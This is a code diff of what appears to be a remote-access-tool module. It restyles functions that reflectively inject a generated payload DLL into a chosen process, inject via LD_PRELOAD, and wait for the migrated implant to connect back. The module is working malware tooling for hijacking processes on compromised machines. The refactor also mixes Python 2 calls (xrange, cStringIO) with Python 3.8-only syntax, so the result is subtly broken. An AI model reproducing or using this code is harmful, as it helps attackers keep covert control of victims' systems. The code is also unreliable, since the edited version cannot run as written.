@@ -4,19 +4,21 @@ import gzip
 import cStringIO
 
 def has_proc_migrated(client, pid):
-    for c in client.pupsrv.clients:
-        if all([
-            True for x in c.desc if x in [
-                "hostname",
-                "platform",
-                "release",
-                "version",
-                "macaddr"
-            ] and client.desc[x]==c.desc[x]
-        ]):
-            if int(c.desc["pid"])==pid:
-                return c
-    return None
+    return next(
+        (
+            c
+            for c in client.pupsrv.clients
+            if all(
+                True
+                for x in c.desc
+                if x
+                in ["hostname", "platform", "release", "version", "macaddr"]
+                and client.desc[x] == c.desc[x]
+            )
+            and int(c.desc["pid"]) == pid
+        ),
+        None,
+    )
 
 def get_payload(module, compressed=True, debug=False, from_payload=None):
     dllbuff = None
@@ -24,7 +26,7 @@ def get_payload(module, compressed=True, debug=False, from_payload=None):
         with open(from_payload, 'rb') as payload:
             dllbuff = payload.read()
 
-        module.success('Precompiled payload: {}'.format(from_payload))
+        module.success(f'Precompiled payload: {from_payload}')
     else:
         conf = module.client.get_conf()
         dllbuff, _, _ = pupygen.generate_binary_from_template(
@@ -46,9 +48,8 @@ def get_payload(module, compressed=True, debug=False, from_payload=None):
 
 def wait_connect(module, pid, timeout=10):
     module.success("waiting for a connection from the DLL ...")
-    for x in xrange(timeout):
-        c = has_proc_migrated(module.client, pid)
-        if c:
+    for _ in xrange(timeout):
+        if c := has_proc_migrated(module.client, pid):
             module.success("got a connection from migrated DLL !")
             c.pupsrv.move_id(c, module.client)
             time.sleep(0.5)
@@ -74,7 +75,7 @@ def ld_preload(module, command, wait_thread=False, keep=False, debug=False, from
         module.error('Inject failed')
         return
     else:
-        module.success('Process created: {}'.format(pid))
+        module.success(f'Process created: {pid}')
 
     if not keep:
         wait_connect(module, pid)
@@ -84,11 +85,9 @@ def ld_preload(module, command, wait_thread=False, keep=False, debug=False, from
 def migrate(module, pid, keep=False, timeout=10, debug=False, from_payload=None):
     payload = get_payload(module, debug, from_payload=from_payload)
 
-    r = module.client.conn.modules['pupy'].reflective_inject_dll(
+    if r := module.client.conn.modules['pupy'].reflective_inject_dll(
         pid, payload
-    )
-
-    if r:
+    ):
         module.success("DLL injected !")
     else:
         module.error("Injection failed !")
